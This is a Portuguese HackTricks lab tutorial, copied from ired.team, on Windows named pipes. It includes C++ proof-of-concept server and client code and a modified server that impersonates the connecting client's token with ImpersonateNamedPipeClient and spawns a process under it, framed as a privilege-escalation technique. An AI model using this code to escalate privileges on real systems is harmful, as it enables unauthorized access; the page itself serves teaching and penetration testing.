## Impersonação de Cliente de Pipe Nomeado

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

**Esta informação foi copiada de** [**https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation**](https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation)

## Visão Geral

Um `pipe` é um bloco de memória compartilhada que os processos podem usar para comunicação e troca de dados.

`Named Pipes` é um mecanismo do Windows que permite que dois processos não relacionados troquem dados entre si, mesmo que os processos estejam localizados em duas redes diferentes. É muito semelhante à arquitetura cliente/servidor, pois existem noções como `um servidor de pipe nomeado` e um `cliente de pipe nomeado`.

Um servidor de pipe nomeado pode abrir um pipe nomeado com um nome pré-definido e, em seguida, um cliente de pipe nomeado pode se conectar a esse pipe por meio do nome conhecido. Uma vez estabelecida a conexão, a troca de dados pode começar.

Este laboratório se preocupa com um código PoC simples que permite:

* criar um servidor de pipe nomeado burro de thread único que aceitará uma conexão de cliente
* servidor de pipe nomeado escrever uma mensagem simples no pipe nomeado para que o cliente de pipe possa lê-la

## Código

Abaixo está o PoC para o servidor e o cliente:

{% tabs %}
{% tab title="namedPipeServer.cpp" %}
```cpp
#include "pch.h"
#include <Windows.h>
#include <iostream>

int main() {
	LPCWSTR pipeName = L"\\\\.\\pipe\\mantvydas-first-pipe";
	LPVOID pipeBuffer = NULL;
	HANDLE serverPipe;
	DWORD readBytes = 0;
	DWORD readBuffer = 0;
	int err = 0;
	BOOL isPipeConnected;
	BOOL isPipeOpen;
	wchar_t message[] = L"HELL";
	DWORD messageLenght = lstrlen(message) * 2;
	DWORD bytesWritten = 0;

	std::wcout << "Creating named pipe " << pipeName << std::endl;
	serverPipe = CreateNamedPipe(pipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE, 1, 2048, 2048, 0, NULL);
	
	isPipeConnected = ConnectNamedPipe(serverPipe, NULL);
	if (isPipeConnected) {
		std::wcout << "Incoming connection to " << pipeName << std::endl;
	}
	
	std::wcout << "Sending message: " << message << std::endl;
	WriteFile(serverPipe, message, messageLenght, &bytesWritten, NULL);
	
	return 0;
}
```
{% endtab %}

{% tab title="namedPipeServer.cpp" %}
```cpp
#include "pch.h"
#include <iostream>
#include <Windows.h>

const int MESSAGE_SIZE = 512;

int main()
{
	LPCWSTR pipeName = L"\\\\10.0.0.7\\pipe\\mantvydas-first-pipe";
	HANDLE clientPipe = NULL;
	BOOL isPipeRead = true;
	wchar_t message[MESSAGE_SIZE] = { 0 };
	DWORD bytesRead = 0;

	std::wcout << "Connecting to " << pipeName << std::endl;
	clientPipe = CreateFile(pipeName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
	
	while (isPipeRead) {
		isPipeRead = ReadFile(clientPipe, &message, MESSAGE_SIZE, &bytesRead, NULL);
		std::wcout << "Received message: " << message;
	}

	return 0;
}
```
## Execução

Abaixo mostra o servidor de pipe nomeado e o cliente de pipe nomeado funcionando como esperado:

![](<../../.gitbook/assets/Screenshot from 2019-04-02 23-44-22.png>)

Vale ressaltar que a comunicação de pipes nomeados por padrão usa o protocolo SMB:

![](<../../.gitbook/assets/Screenshot from 2019-04-04 23-51-48.png>)

Verificando como o processo mantém um identificador para o nosso pipe nomeado `mantvydas-first-pipe`:

![](<../../.gitbook/assets/Screenshot from 2019-04-02 23-44-22 (1).png>)

Da mesma forma, podemos ver o cliente tendo um identificador aberto para o pipe nomeado:

![](<../../.gitbook/assets/Screenshot from 2019-04-02 23-44-22 (2).png>)

Podemos até ver nosso pipe com powershell:
```csharp
((Get-ChildItem \\.\pipe\).name)[-1..-5]
```
## Impersonação de Token

{% hint style="info" %}
Observe que, para impessoanar o token do processo do cliente, você precisa ter (o processo do servidor criando o pipe) o privilégio de token **`SeImpersonate`**
{% endhint %}

É possível para o servidor de pipe nomeado impessoanar o contexto de segurança do cliente de pipe nomeado, aproveitando uma chamada de API `ImpersonateNamedPipeClient`, que por sua vez altera o token do thread atual do servidor de pipe nomeado com o token do cliente de pipe nomeado.

Podemos atualizar o código do servidor de pipe nomeado assim para alcançar a impessoação - observe que as modificações são vistas na linha 25 e abaixo:
```cpp
int main() {
	LPCWSTR pipeName = L"\\\\.\\pipe\\mantvydas-first-pipe";
	LPVOID pipeBuffer = NULL;
	HANDLE serverPipe;
	DWORD readBytes = 0;
	DWORD readBuffer = 0;
	int err = 0;
	BOOL isPipeConnected;
	BOOL isPipeOpen;
	wchar_t message[] = L"HELL";
	DWORD messageLenght = lstrlen(message) * 2;
	DWORD bytesWritten = 0;

	std::wcout << "Creating named pipe " << pipeName << std::endl;
	serverPipe = CreateNamedPipe(pipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE, 1, 2048, 2048, 0, NULL);
	
	isPipeConnected = ConnectNamedPipe(serverPipe, NULL);
	if (isPipeConnected) {
		std::wcout << "Incoming connection to " << pipeName << std::endl;
	}
	
	std::wcout << "Sending message: " << message << std::endl;
	WriteFile(serverPipe, message, messageLenght, &bytesWritten, NULL);
	
	std::wcout << "Impersonating the client..." << std::endl;
	ImpersonateNamedPipeClient(serverPipe);
	err = GetLastError();	

	STARTUPINFO	si = {};
	wchar_t command[] = L"C:\\Windows\\system32\\notepad.exe";
	PROCESS_INFORMATION pi = {};
	HANDLE threadToken = GetCurrentThreadToken();
	CreateProcessWithTokenW(threadToken, LOGON_WITH_PROFILE, command, NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);

	return 0;
}
```
Executando o servidor e conectando-se a ele com o cliente que está sendo executado sob o contexto de segurança administrator@offense.local, podemos ver que a thread principal do pipe do servidor nomeado assumiu o token do cliente do pipe nomeado - offense\administrator, embora o PipeServer.exe em si esteja sendo executado sob o contexto de segurança ws01\mantvydas. Parece ser uma boa maneira de escalar privilégios?
